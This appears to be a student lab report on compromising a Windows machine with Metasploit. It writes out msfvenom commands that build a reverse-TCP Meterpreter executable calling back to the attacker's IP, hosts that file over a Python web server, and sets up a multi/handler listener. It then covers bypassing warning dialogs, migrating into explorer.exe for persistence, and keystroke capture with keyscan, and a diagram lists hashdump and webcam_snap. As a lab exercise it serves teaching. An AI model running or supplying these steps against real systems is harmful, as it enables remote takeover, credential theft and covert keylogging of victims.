NAME: GOPIKA A

REG NO: 212224100017

# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

### Developed By

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:


## Architecture Diagram

```bash
## 🛠️ Metasploit Exploitation Architecture (Windows Target)


+----------------+                           +------------------+
|  🟢 Attacker    |      🔁 Reverse Shell      |   🔴 Victim (Win) |
|  (Kali Linux)  | <------------------------- |  Unpatched SMB   |
|  - msfconsole  |       (TCP 4444)          |  RDP, AV Bypass  |
|  - handler     |                           |                  |
+-------+--------+                           +--------+---------+
        |                                             |
        |  ⚙️ Payload generation using msfvenom        |
        |                                             |
        v                                             v
msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload  
         LHOST=attacker_ip LPORT=4444               or exploit triggers  
         -f exe > evil.exe  

        |
        |  🧲 Listener waits (multi/handler)
        v

+------------------------------------------------------------+
|     🧠 Meterpreter Session Established (shell access)       |
+------------------------------------------------------------+
| Commands: sysinfo | hashdump | migrate | webcam_snap | etc |
+------------------------------------------------------------+

```
### PROGRAM:

Find the attackers ip address using ifconfig

### Output:

<img width="994" height="575" alt="image" src="https://github.com/user-attachments/assets/a925ee74-1c2d-4eb2-9d11-38c4722f0502" />


Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe```

### Output:

<img width="956" height="265" alt="image" src="https://github.com/user-attachments/assets/4cc8a637-28ca-4a43-8efe-4cc8ec866d22" />


Check the status of apache2 ```sudo apache2 status```

<img width="896" height="688" alt="image" src="https://github.com/user-attachments/assets/047c66e2-b3fe-44bf-b383-c62cd321d081" />

Start python server ```python3 -m http.server```

<img width="756" height="85" alt="image" src="https://github.com/user-attachments/assets/803f47d2-1d1e-4e43-a19b-2ed7286e4460" />

Invoke msfconsole:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

## Output 
<img width="1112" height="808" alt="image" src="https://github.com/user-attachments/assets/49d72604-4974-4be9-8af4-4744daef949d" />


Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```

### Output 

<img width="955" height="496" alt="image" src="https://github.com/user-attachments/assets/3629eb2d-ede7-40ea-9a46-6633c21bcb66" />

<img width="871" height="314" alt="image" src="https://github.com/user-attachments/assets/18be0023-5d4c-4deb-b5d0-259c04d4a4b3" />

<img width="641" height="78" alt="image" src="https://github.com/user-attachments/assets/19b2bfe2-dd3c-4c8d-bc40-1b1d7c3c4247" />



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://192.168.1.2/fun.exe``` The file "fun.exe" downloads.

<img width="1919" height="960" alt="image" src="https://github.com/user-attachments/assets/ad603eae-8a6e-40bf-b681-a8d2c7b0f789" />

<img width="1915" height="962" alt="image" src="https://github.com/user-attachments/assets/a1f312f7-147b-47e9-a0f8-da26385f9c04" />

Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit



To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

#### Post Exploitation:
The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.



keyscan_dump Shows the keystrokes captured so far



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.

